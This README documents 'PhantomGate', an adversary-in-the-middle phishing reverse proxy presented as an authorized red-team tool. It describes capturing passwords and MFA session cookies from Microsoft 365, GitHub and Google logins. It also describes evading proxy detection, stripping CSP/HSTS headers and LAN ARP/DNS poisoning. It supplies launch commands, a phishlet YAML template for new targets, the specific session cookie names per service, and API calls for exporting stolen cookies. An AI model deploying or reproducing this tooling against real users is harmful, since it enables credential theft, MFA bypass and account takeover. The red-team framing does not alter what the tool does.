# PhantomGate

> Advanced Adversary-in-the-Middle (AiTM) Reverse Proxy Framework for Authorized Red Team Engagements

**PhantomGate** is a precision-engineered AiTM reverse proxy that transparently sits between a victim and a real authentication portal (Microsoft 365, GitHub, Google, etc.). It captures credentials, intercepts MFA tokens, and steals authenticated session cookies — all in real-time.

> **LEGAL DISCLAIMER:** This tool is designed **exclusively** for authorized penetration testing and Red Team engagements. Unauthorized use against systems you do not have explicit written permission to test is illegal under the CFAA and equivalent laws worldwide.

---

## Quick Start (Zero Knowledge Required)

```bash
# 1. Clone and setup (one command)
git clone <repo-url> && cd PhantomGate
chmod +x setup.sh demo.sh
./setup.sh

# 2. Run the interactive demo (safe, local-only)
./demo.sh
```

The demo runs a complete attack flow on localhost with a fake target — no real systems are contacted. It walks you through each step with explanations.

---

## Features

- **Transparent Reverse Proxy** — Victims see the real login page; PhantomGate sits invisibly in the middle
- **MFA Bypass** — Captures post-authentication session cookies, making MFA irrelevant
- **Phishlet System** — YAML-based target definitions for easy multi-target support
- **Credential Capture** — Real-time extraction of usernames and passwords from POST bodies
- **Session Hijacking** — Automatically captures and aggregates auth tokens for session replay
- **Operator Dashboard** — Real-time WebSocket-powered terminal UI with live victim tracking
- **Lure Generator** — Creates unique tracking URLs for individual targets
- **JS Injection** — Inject custom JavaScript into proxied pages via phishlet config
- **Timing Jitter** — Random 0-50ms delays to evade automated proxy detection
- **Stealth Engine** — Strips proxy headers, spoofs server identity, removes CSP/HSTS headers
- **Thread-Safe** — All concurrent data access protected with proper synchronization
- **Cross-Platform** — Single binary for Linux, Windows, and macOS

## Architecture

```
Victim → [HTTPS] → PhantomGate Proxy → [HTTPS] → Real Target (e.g., Microsoft 365)
                        ↓
                   Captures:
                   - Credentials (username/password)
                   - MFA session cookies
                   - Browser fingerprints
                        ↓
                   Operator Dashboard (WebSocket, auth-protected)
```

## Usage

### Real Engagement

```bash
# Standard (requires root for ports 80/443)
sudo ./bin/phantomgate \
  --domain your-phish-domain.com \
  --phishlet microsoft365 \
  --admin-pass YourSecurePassword

# Custom ports (no root needed)
./bin/phantomgate \
  --domain your-phish-domain.com \
  --phishlet microsoft365 \
  --https-port 8443 \
  --http-port 8080 \
  --admin-port 9443 \
  --admin-pass YourSecurePassword

# With LAN DNS interception (Linux only, requires root)
sudo ./bin/phantomgate \
  --domain your-phish-domain.com \
  --phishlet microsoft365 \
  --admin-pass YourSecurePassword \
  --intercept --gateway 192.168.1.1

# List available phishlets
./bin/phantomgate --list
```

### CLI Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--domain` | (required) | Phishing domain name |
| `--phishlet` | (required) | Phishlet name to activate |
| `--phishlet-dir` | `phishlets/` | Directory containing phishlet YAML files |
| `--https-port` | `443` | HTTPS proxy listener port |
| `--http-port` | `80` | HTTP redirect listener port |
| `--admin-port` | `8443` | Operator dashboard port |
| `--admin-pass` | (required) | Dashboard authentication password |
| `--store` | `data.json` | Path for persistent data storage |
| `--intercept` | `false` | Enable ARP + DNS interception on LAN |
| `--gateway` | | Gateway IP for interception mode |
| `--list` | | List available phishlets and exit |

## Project Structure

```
PhantomGate/
├── cmd/phantomgate/main.go       # CLI entry point
├── internal/
│   ├── proxy/
│   │   ├── proxy.go              # Core AiTM reverse proxy engine
│   │   ├── proxy_test.go         # Proxy tests
│   │   ├── tls.go                # Self-signed TLS cert generation (ECDSA P-256)
│   │   └── tls_test.go           # TLS tests
│   ├── capture/
│   │   ├── credentials.go        # Credential interception (form + JSON)
│   │   ├── credentials_test.go   # Credential tests
│   │   ├── sessions.go           # Session cookie hijacking (thread-safe)
│   │   └── sessions_test.go      # Session tests
│   ├── phishlet/
│   │   ├── engine.go             # Phishlet YAML loader + manager
│   │   └── engine_test.go        # Phishlet tests
│   ├── lure/
│   │   ├── generator.go          # Tracking URL generator
│   │   └── generator_test.go     # Lure tests
│   ├── store/
│   │   ├── store.go              # JSON data persistence + notifications
│   │   └── store_test.go         # Store tests
│   ├── dashboard/
│   │   ├── server.go             # REST API + WebSocket (auth-protected)
│   │   └── ui.go                 # Embedded dashboard HTML/CSS/JS
│   ├── dns/                      # ARP poisoning + DNS interception (Linux)
│   └── config/
│       ├── config.go             # Configuration system
│       └── config_test.go        # Config tests
├── test/fake_target/             # Local test server for demos
├── phishlets/
│   ├── microsoft365.yml          # Microsoft 365 / Azure AD
│   ├── github.yml                # GitHub
│   ├── google.yml                # Google Workspace
│   └── testapp.yml               # Local test phishlet
├── setup.sh                      # One-command build + install
├── demo.sh                       # Interactive demo (safe, local-only)
├── LICENSE                       # MIT + security disclaimer
└── README.md
```

## Phishlets

| Phishlet | Target | Auth Tokens Captured |
|----------|--------|---------------------|
| `microsoft365` | Microsoft 365 / Azure AD | ESTSAUTH, ESTSAUTHPERSISTENT, OIDCAuthCookie |
| `github` | GitHub | user_session, dotcom_user, _gh_sess |
| `google` | Google Workspace | SID, HSID, SSID, APISID, SAPISID |
| `testapp` | Local fake target (demo) | session_token, auth_id |

### Writing Custom Phishlets

```yaml
name: "My Target"
description: "Custom phishlet for internal app"
author: "operator"
min_ver: "1.0.0"

proxy_hosts:
  - phish_sub: "login"
    orig_sub: "login"
    domain: "target.com"
    is_ssl: true

credentials:
  username:
    key: "email"
    search: '.*'
    type: "post"
  password:
    key: "password"
    search: '.*'
    type: "post"

auth_tokens:
  - domain: ".target.com"
    keys:
      - "session_id"
      - "auth_token"

login_path: "/login"
```

## Operator Dashboard

Access the real-time operator console at `http://localhost:<admin-port>` (default 8443).

- **Authentication**: Token-based via `X-Admin-Token` header (REST) or `?token=` query param (WebSocket)
- **Live Feed**: Real-time credential and session capture via WebSocket
- **Victim Table**: IP, user-agent, timestamps, credential count, session status
- **Cookie Export**: One-click export of stolen session cookies for browser import
- **Stats API**: `GET /api/stats` for victim/credential/session counts

### Dashboard API

```bash
# Get stats
curl http://localhost:9443/api/stats -H "X-Admin-Token: YOUR_PASSWORD"

# List victims
curl http://localhost:9443/api/victims -H "X-Admin-Token: YOUR_PASSWORD"

# Export session cookies for a victim
curl "http://localhost:9443/api/sessions/export?victim_id=VICTIM_ID" \
  -H "X-Admin-Token: YOUR_PASSWORD"
```

## Testing

```bash
# Run all tests
go test ./...

# Run with race detection
go test -race ./...

# Run specific package
go test ./internal/capture/...
```

## Building

```bash
# Using setup.sh (recommended)
./setup.sh

# Manual build
go build -ldflags "-s -w" -o bin/phantomgate ./cmd/phantomgate
go build -o bin/fake_target ./test/fake_target

# Cross-compile
./setup.sh --cross
```

## License

MIT — See [LICENSE](LICENSE) for full terms including security research disclaimer.
